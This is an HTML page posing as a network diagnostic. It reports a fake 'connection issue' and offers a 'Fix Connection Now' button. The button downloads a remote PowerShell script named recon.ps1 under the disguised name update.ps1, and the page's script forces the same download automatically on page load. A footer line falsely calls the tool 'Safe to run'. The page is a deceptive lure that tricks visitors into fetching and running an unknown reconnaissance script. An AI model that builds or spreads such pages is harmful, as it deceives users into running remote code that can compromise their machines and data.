<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Network Optimization</title>
  <style>
    body { 
      background: #111; 
      color: #0f0; 
      font-family: Arial; 
      text-align: center; 
      padding: 60px; 
    }
    button { 
      padding: 15px 40px; 
      font-size: 18px; 
      background: #0f0; 
      color: #000; 
      border: none; 
      cursor: pointer; 
      margin: 30px;
    }
  </style>
</head>
<body>
  <h1>Network Connection Issue Detected</h1>
  <p>Click below to run a quick diagnostic and fix.</p>
  
  <a href="https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1" download="update.ps1">
    <button>Fix Connection Now</button>
  </a>

  <p style="margin-top: 40px; font-size: 14px; color: #666;">
    Small diagnostic tool • Safe to run
  </p>

  <script>
    // Try to force download on page load (may still need click on some browsers)
    setTimeout(() => {
      const link = document.createElement('a');
      link.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
      link.download = "update.ps1";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 800);
  </script>
</body>
</html>
